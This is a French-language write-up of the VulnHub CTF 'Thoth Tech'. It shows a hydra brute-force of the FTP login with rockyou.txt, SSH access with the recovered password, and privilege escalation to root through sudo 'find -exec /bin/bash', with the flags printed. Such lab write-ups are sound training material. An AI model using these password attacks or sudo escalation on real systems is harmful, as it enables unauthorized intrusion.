---
title: "Solution du CTF Thoth Tech de VulnHub"
tags: [VulnHub, CTF]
---

Le CTF [Thoth Tech](https://vulnhub.com/entry/thoth-tech-1,734/) a été l'un des challenges les plus courts que j'ai résolu, peut être même le plus court.

En fait, télécharger la VM a pris plus de temps que de résoudre le CTF.

Nmap retourne trois ports ouverts pour la machine :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Le FTP autorise les connexions anonymes et on y trouve un fichier `note.txt` :

```
Dear pwnlab,

My name is jake. Your password is very weak and easily crackable, I think change your password.
```

Du coup je lance le bruteforce sur le serveur FTP :

```console
$ hydra -e nsr -l pwnlab -P rockyou.txt ftp://192.168.56.147
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-02 10:38:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344384 login tries (l:1/p:14344384), ~896524 tries per task
[DATA] attacking ftp://192.168.56.147:21/
[21][ftp] host: 192.168.56.147   login: pwnlab   password: babygirl1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-02 10:39:28
```

Cet identifiant fonctionne aussi sur le SSH :

```console
pwnlab@thothtech:~$ cat user.txt 
5ec2a44a73e7b259c6b0abc174291359
```

Petit aparté sur le port 80 : à l'adresse `/wordpress` on trouve un *Wordpress* configuré avec une adresse IP autre que celle que la VM a récupérée par DHCP... Du coup pas vraiment utilisable.

Quoi qu'il en soit notre utilisateur peut lancer `find` via `sudo` :

```console
pwnlab@thothtech:~$ sudo -l
Matching Defaults entries for pwnlab on thothtech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwnlab may run the following commands on thothtech:
    (root) NOPASSWD: /usr/bin/find
pwnlab@thothtech:~$ sudo /usr/bin/find /etc/passwd -exec /bin/bash \;
root@thothtech:/home/pwnlab# cd /root
root@thothtech:~# ls
root.txt  snap
root@thothtech:~# cat root.txt
Root flag: d51546d5bcf8e3856c7bff5d201f0df6

good job :)
```


